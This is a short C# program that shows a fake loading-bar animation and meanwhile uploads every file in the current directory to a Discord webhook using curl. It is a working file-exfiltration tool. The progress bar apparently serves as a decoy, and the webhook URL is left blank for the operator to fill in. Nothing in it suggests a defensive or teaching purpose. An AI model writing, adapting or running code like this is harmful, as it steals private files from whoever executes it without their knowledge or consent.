using System;

class Program
{
    static void PrintAsciiAnimation(string[] asciiArt, int iterations, double delay)
    {
        for (int i = 0; i < iterations; i++)
        {
            foreach (string line in asciiArt)
            {
                Console.Write(line);
                System.Threading.Thread.Sleep(TimeSpan.FromSeconds(delay));
                Console.CursorLeft = 0;
            }
        }
        Console.WriteLine();
    }

    static void SendToDiscord(string fileName, string webhookUrl)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName = "curl",
            Arguments = $"-s -F file1=@\"{fileName}\" \"{webhookUrl}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = System.Diagnostics.Process.Start(psi);
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"SEND : {fileName}");
        }
        else
        {
            Console.Error.WriteLine($"ERROR WEBHOOK : {fileName}");
        }
    }

    static void TraverseDirectory(string folderPath, string webhookUrl)
    {
        string[] files = System.IO.Directory.GetFiles(folderPath);

        foreach (string filePath in files)
        {
            Console.WriteLine($"SEND : {filePath}");
            SendToDiscord(filePath, webhookUrl);
        }
    }

    static void Main()
    {
        string[] loadingAnimation =
        {
            "[--------]   0% ",
            "[█-------]   10% ",
            "[██------]   20% ",
            "[███-----]   30% ",
            "[████----]   40% ",
            "[█████---]   50% ",
            "[██████--]   60% ",
            "[███████-]   70% ",
            "[████████]   100% "
        };

        PrintAsciiAnimation(loadingAnimation, 1, 0.1);

        string folderPath = System.IO.Directory.GetCurrentDirectory();
        string webhookUrl = ""; // YOUR WEBHOOK
        TraverseDirectory(folderPath, webhookUrl);
    }
}
